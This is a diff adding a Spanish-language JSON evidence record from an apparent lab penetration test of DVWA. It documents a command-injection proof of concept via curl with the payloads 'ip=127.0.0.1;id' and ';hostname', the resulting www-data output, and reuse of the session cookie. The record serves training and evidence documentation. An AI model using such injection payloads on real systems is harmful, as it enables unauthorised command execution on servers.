@@ -1,0 +1,42 @@
+{
+  "_comment": "Evidencia REAL de las Fases 3 (Gaining Access) y 4 (Maintaining Access). PoC de Command Injection (CWE-78) sobre DVWA en nivel Low y reutilizacion de la sesion autenticada. Cada HTTP crudo (login, security, exec, lsweb, cookies) con sha256; artefacto principal = exec_post.html del gaining (contiene la prueba 'uid=33(www-data)'). volatility_rank 5 (disco); fuente original en memoria HTTP del contenedor DVWA. RFC 3227 (Req 5.6, 16.1), Documentation & Reproducibility (Req 16.4), Evidence Integrity (Req 5.3).",
+  "evidence_id": "webex-dvwa-01-0001",
+  "source_asset": "dvwa-01",
+  "collected_by": "agente-kiro",
+  "collected_at_utc": "2026-11-10T18:55:10Z",
+  "tool": "curl",
+  "tool_version": "8.17.0",
+  "command": "curl -b/-c cookies.txt --data-urlencode 'ip=127.0.0.1;id' --data-urlencode 'Submit=Submit' http://10.50.0.224/vulnerabilities/exec/",
+  "result": "Command Injection DEMOSTRADO. El servidor ejecuto 'id' tras el payload ';id' en el parametro 'ip' (uid=33(www-data) gid=33(www-data) groups=33(www-data)). Hostname del contenedor DVWA: 1288e81c1735. Sesion reutilizada 2 min 7s despues sin re-login (ls /vulnerabilities/exec/ confirmo que NO quedo webshell: solo help, index.php, source).",
+  "sha256": "3975c375303c02496490be3775a7d4a870df08132bf96261ef62b5ba5b0331b9",
+  "volatility_rank": 5,
+  "storage": "append-only://evidence/webex-dvwa-01-0001/raw/",
+  "related_phase": "Gaining Access + Maintaining Access",
+  "iocs": {
+    "endpoint": "POST http://10.50.0.224/vulnerabilities/exec/",
+    "payload_gaining": "ip=127.0.0.1;id",
+    "payload_maintaining": "ip=127.0.0.1;hostname",
+    "uid_output": "uid=33(www-data) gid=33(www-data)",
+    "hostname_target": "1288e81c1735",
+    "session_cookie_name": "PHPSESSID",
+    "session_cookie_flags": "sin HttpOnly, sin Secure, sin SameSite",
+    "security_cookie": "security=low (controlado desde el cliente)",
+    "cwe": "CWE-78",
+    "owasp": "A03:2021 Injection",
+    "cvss_v3_estimated": "9.8 (CRITICAL) AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  },
+  "artifacts": [
+    {"path": "raw/gaining/exec_post.html",     "sha256": "3975c375303c02496490be3775a7d4a870df08132bf96261ef62b5ba5b0331b9", "role": "principal: prueba de inyeccion (uid)"},
+    {"path": "raw/gaining/exec_get.html",      "sha256": "e2e1835f3997ee8501a7affe5b3c548665941dbe5bc11313b367b4e6a7bdff62", "role": "contexto: pagina del modulo exec"},
+    {"path": "raw/gaining/login_get.html",     "sha256": "de13532adf960ab5fd666cb211827498014c025ca8a2b44aa1854aa2e2d9802e", "role": "paso 1: GET login"},
+    {"path": "raw/gaining/login_post.html",    "sha256": "d0a192865094349314633be65e0cd1cc80de640899b19a0d51795aa53a1a77eb", "role": "paso 2: POST login OK"},
+    {"path": "raw/gaining/sec_get.html",       "sha256": "00db48a6fc8f7ae2d423a7915fb40a83fcd358c102e2d6d77ce1eba57fa1a7b9", "role": "paso 3a: GET security"},
+    {"path": "raw/gaining/sec_post.html",      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "role": "paso 3b: POST security=low (302, body vacio)"},
+    {"path": "raw/gaining/cookies.txt",        "sha256": "8e8fe66acaab260e1b939e41e916e991e58cf40735ea5ccab2bf8a69b6fe610c", "role": "jar de la sesion autenticada"},
+    {"path": "raw/maintaining/sec_reused.html",         "sha256": "a679a368b195a883e5a9390caad4dcbc1c61b63152d6e06015c0bf76eebcae48", "role": "re-uso de cookie: sesion viva"},
+    {"path": "raw/maintaining/exec_reused_get.html",    "sha256": "9d0da7eaf2e7edf38cac9f637245c69de568c4a9c5d9912298799732cc4a4218", "role": "acceso al modulo 15s despues"},
+    {"path": "raw/maintaining/exec_reused_post.html",   "sha256": "99a0fac303e7deeeae5c2e17bcfefaa13a6e4e1d979c490be96282a974c61e26", "role": "2do PoC: ;hostname -> 1288e81c1735"},
+    {"path": "raw/maintaining/lsweb.html",              "sha256": "89ba50f1085bb0f0acb6963815d276258ef1443e25d2c9da82e82ac6a30f7130", "role": "no-persistencia: ls del modulo sin archivos extra"},
+    {"path": "raw/maintaining/session_reused.txt",      "sha256": "8e8fe66acaab260e1b939e41e916e991e58cf40735ea5ccab2bf8a69b6fe610c", "role": "jar reutilizado (identico al de gaining)"}
+  ]
+}
